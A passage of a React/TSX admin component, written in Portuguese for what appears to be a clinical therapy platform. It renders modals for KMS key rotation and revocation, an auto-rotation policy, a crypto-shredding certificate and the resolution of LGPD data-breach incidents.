            <form onSubmit={handleRotateKmsKey} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Justificativa da Rotação (Trilha WORM):
                </label>
                <input
                  type="text"
                  required
                  value={rotateReason}
                  onChange={(e) => setRotateReason(e.target.value)}
                  placeholder="Ex: Auditoria trimestral NIST SP 800-57"
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                />
              </div>

              <label className="flex items-start gap-2.5 p-3 rounded-xl bg-amber-50/60 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800/60 cursor-pointer">
                <input
                  type="checkbox"
                  checked={rotateReWrapOption}
                  onChange={(e) => setRotateReWrapOption(e.target.checked)}
                  className="mt-0.5 rounded text-amber-600 focus:ring-amber-500"
                />
                <div className="text-[11px] text-slate-700 dark:text-slate-300">
                  <span className="font-bold text-amber-900 dark:text-amber-200 block">Re-envelopar DEKs Legadas Imediatamente</span>
                  Re-encripta as chaves de dados dos terapeutas para a nova KEK ativa sem tocar no texto clínico em repouso.
                </div>
              </label>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowRotateKmsModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={rotatingKms || !rotateReason.trim()}
                  className="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {rotatingKms ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>Gerando Nova Versão...</span>
                    </>
                  ) : (
                    <>
                      <KeyRound className="w-3.5 h-3.5" />
                      <span>Confirmar Rotação KEK</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Política de Auto-Rotação KMS */}
      {showKmsPolicyModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Workflow className="w-5 h-5 text-amber-600 dark:text-amber-400" />
                Política de Rotação Automática KMS
              </h3>
              <button 
                onClick={() => setShowKmsPolicyModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleUpdateKmsPolicy} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Intervalo de Rotação (Dias):
                </label>
                <select
                  value={policyIntervalDays}
                  onChange={(e) => setPolicyIntervalDays(Number(e.target.value))}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                >
                  <option value={30}>30 Dias (Alta Segurança / Homologação)</option>
                  <option value={90}>90 Dias (Recomendação NIST SP 800-57)</option>
                  <option value={180}>180 Dias (Semestral)</option>
                  <option value={365}>365 Dias (Anual RFC-001 §4.2 Padrão)</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Alerta Preventivo de Expiração (Dias):
                </label>
                <input
                  type="number"
                  min={1}
                  max={60}
                  value={policyAlertDays}
                  onChange={(e) => setPolicyAlertDays(Number(e.target.value))}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                />
              </div>

              <label className="flex items-center gap-2.5 p-3 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700 cursor-pointer">
                <input
                  type="checkbox"
                  checked={policyAutoReWrap}
                  onChange={(e) => setPolicyAutoReWrap(e.target.checked)}
                  className="rounded text-amber-600 focus:ring-amber-500"
                />
                <span className="text-xs text-slate-700 dark:text-slate-300">
                  Executar Re-wrapping de DEKs legadas automaticamente a cada rotação
                </span>
              </label>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowKmsPolicyModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={loadingKms}
                  className="px-4 py-2 rounded-xl bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer"
                >
                  Salvar Política
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Revogação de Versão Legada de KEK */}
      {revokeKeyModalTarget && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-rose-200 dark:border-rose-900/60 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-rose-100 dark:border-rose-950">
              <h3 className="text-base font-bold text-rose-600 dark:text-rose-400 flex items-center gap-2">
                <ShieldAlert className="w-5 h-5" />
                Revogar KEK Versão {revokeKeyModalTarget.version}
              </h3>
              <button 
                onClick={() => setRevokeKeyModalTarget(null)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="p-3 rounded-xl bg-rose-50 dark:bg-rose-950/30 border border-rose-200 dark:border-rose-800 text-[11px] text-rose-800 dark:text-rose-300 space-y-1">
              <p className="font-bold">⚠️ Ação Criptográfica Irreversível</p>
              <p>
                Ao revogar a versão {revokeKeyModalTarget.version}, qualquer DEK que ainda dependa dela não poderá mais ser decifrada.
                Certifique-se de que todas as DEKs foram previamente re-envelopadas para a KEK ativa.
              </p>
            </div>

            <form onSubmit={handleRevokeKmsKey} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Justificativa Formal (Trilha WORM):
                </label>
                <input
                  type="text"
                  required
                  value={revokeReason}
                  onChange={(e) => setRevokeReason(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                />
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setRevokeKeyModalTarget(null)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={loadingKms || !revokeReason.trim()}
                  className="px-4 py-2 rounded-xl bg-rose-600 hover:bg-rose-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {loadingKms ? 'Revogando...' : 'Confirmar Revogação'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Certificado Forense de Crypto-Shredding (CFP 011/2018 & LGPD Art. 16) */}
      {showCertificateModal && selectedCertificate && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-lg w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
                Certificado Oficial de Crypto-Shredding
              </h3>
              <button 
                onClick={() => setShowCertificateModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="bg-emerald-50 dark:bg-emerald-950/30 p-4 rounded-2xl border border-emerald-200 dark:border-emerald-900/60 text-xs space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-bold text-emerald-900 dark:text-emerald-200 uppercase tracking-wider">
                  Mídia Bruta Destruída Irreversivelmente
                </span>
                <span className="px-2 py-0.5 rounded text-[10px] font-extrabold bg-emerald-200 text-emerald-900 dark:bg-emerald-900 dark:text-emerald-200">
                  {selectedCertificate.method}
                </span>
              </div>
              <p className="text-slate-600 dark:text-slate-300">
                O arquivo de áudio e todos os seus blocos particionados em repouso foram sobrescritos com zeros em memória e tiveram suas chaves DEK purgadas definitivamente, em estrita conformidade com a LGPD e as normas do CFP.
              </p>
            </div>

            <div className="space-y-2 text-xs font-mono bg-slate-50 dark:bg-slate-800/50 p-4 rounded-2xl border border-slate-200 dark:border-slate-700/60">
              <div className="flex justify-between">
                <span className="text-slate-400">ID do Certificado:</span>
                <span className="font-bold text-slate-800 dark:text-slate-200">{selectedCertificate.certificateId}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">ID da Gravação:</span>
                <span className="text-slate-700 dark:text-slate-300">{selectedCertificate.recordingId}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">ID da Sessão Clínica:</span>
                <span className="text-slate-700 dark:text-slate-300">{selectedCertificate.sessionId}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Data/Hora Expurgamento:</span>
                <span className="text-slate-700 dark:text-slate-300">{new Date(selectedCertificate.destroyedAt).toLocaleString('pt-BR')}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Shards Destruídos:</span>
                <span className="font-bold text-emerald-600 dark:text-emerald-400">{selectedCertificate.shreddedShardsCount} shards ({selectedCertificate.totalBytesPurged} bytes)</span>
              </div>
            </div>

            <div className="space-y-1.5 text-[11px] text-slate-500 dark:text-slate-400 bg-slate-50 dark:bg-slate-800/30 p-3 rounded-xl border border-slate-200 dark:border-slate-800">
              <div className="font-bold text-slate-700 dark:text-slate-300">Base Normativa & Deontológica:</div>
              <div>• {selectedCertificate.lgpdBasis}</div>
              <div>• {selectedCertificate.cfpComplianceRule}</div>
            </div>

            <div className="pt-2 border-t border-slate-100 dark:border-slate-800 flex items-center justify-between text-[10px] font-mono text-slate-400">
              <span className="truncate" title={selectedCertificate.probatoryWormDigest}>
                WORM Digest: {selectedCertificate.probatoryWormDigest.slice(0, 16)}...
              </span>
              <button
                type="button"
                onClick={() => {
                  navigator.clipboard.writeText(selectedCertificate.probatoryWormDigest);
                  setFeedback({ type: 'success', message: 'Digest probatório WORM copiado!' });
                }}
                className="px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold cursor-pointer"
              >
                Copiar Digest
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Resolução Formal de Incidente pelo DPO (LGPD Art. 48 & CD/ANPD 15/2024) */}
      {resolvingIncident && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-lg w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
                Resolução Formal de Incidente DPO
              </h3>
              <button 
                onClick={() => setResolvingIncident(null)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="p-3 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700 text-xs space-y-1">
              <div>Conta Comprometida: <strong className="text-slate-900 dark:text-white">{resolvingIncident.userEmailMasked}</strong></div>
              <div>Vetor da Ameaça: <strong className="text-slate-900 dark:text-white">{resolvingIncident.source} ({resolvingIncident.breachTitle})</strong></div>
              <div>Severidade: <strong className="text-rose-600 dark:text-rose-400">{resolvingIncident.severity}</strong></div>
            </div>

            <form onSubmit={handleResolveIncident} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Parecer Técnico & Medidas Corretivas Adotadas:
                </label>
                <textarea
                  rows={3}
                  required
                  value={resolutionNotesInput}
                  onChange={(e) => setResolutionNotesInput(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white resize-none"
                />
              </div>

              <div className="p-3.5 rounded-2xl bg-amber-50/60 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800/60 space-y-2">
                <label className="flex items-center gap-2.5 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={reportedToAnpdInput}
                    onChange={(e) => setReportedToAnpdInput(e.target.checked)}
                    className="rounded text-amber-600 focus:ring-amber-500"
                  />
                  <span className="text-xs font-bold text-amber-900 dark:text-amber-200">
                    Incidente Comunicado Formalmente à ANPD (Resolução CD/ANPD 15/2024)
                  </span>
                </label>

                {reportedToAnpdInput && (
                  <div>
                    <label className="block text-[11px] font-semibold text-slate-600 dark:text-slate-300 mb-1">
                      Número de Protocolo ANPD:
                    </label>
                    <input
                      type="text"
                      value={anpdProtocolInput}
                      onChange={(e) => setAnpdProtocolInput(e.target.value)}
                      placeholder="Ex: ANPD-2026-INC-89412"
                      className="w-full px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs font-mono text-slate-900 dark:text-white"
                    />
                  </div>
                )}
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setResolvingIncident(null)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer"
                >
                  Confirmar Resolução na Trilha WORM
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
